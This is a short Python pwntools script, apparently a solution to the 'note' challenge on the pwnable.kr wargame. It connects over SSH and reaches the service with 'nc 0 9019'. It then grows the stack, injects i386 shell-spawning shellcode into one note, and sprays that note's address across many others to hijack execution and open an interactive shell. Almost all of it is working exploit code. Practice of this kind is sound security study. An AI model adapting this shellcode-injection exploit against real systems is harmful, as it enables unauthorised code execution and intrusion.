from pwn import *


def create_note():
    sh.recvuntil("5. exit\n")
    sh.sendline("1")
    sh.recvuntil(" no ")
    note_no = sh.recvline().rstrip()
    sh.recvuntil("[")
    note_addr = int(sh.recvn(8), 16)
    return note_no, note_addr


def write_note(note_no, content):
    sh.recvuntil("5. exit\n")
    sh.sendline("2")
    sh.recvuntil("no?\n")
    sh.sendline(note_no)
    sh.recvline()
    sh.sendline(content)


con = ssh("note", "pwnable.kr", 2222, "guest")
sh = con.run("nc 0 9019")

# increase stack
for x in range(0, 5000):
    sh.recvuntil("5. exit\n")
    sh.sendline("6")
    log.info("stack %d" % x)

# write shellcode to first note
first_no, first_note_addr = create_note()
write_note("0", asm(shellcraft.i386.sh()))

for x in range(0, 255):
    no, addr = create_note()
    log.info("no: %s / addr: %x" % (no, addr))
    write_note(no, p32(first_note_addr) * 1023)

sh.recvuntil("5. exit\n")
sh.sendline("5")

sh.interactive()

# FYI mmap_s stands for mmap_stupid :p
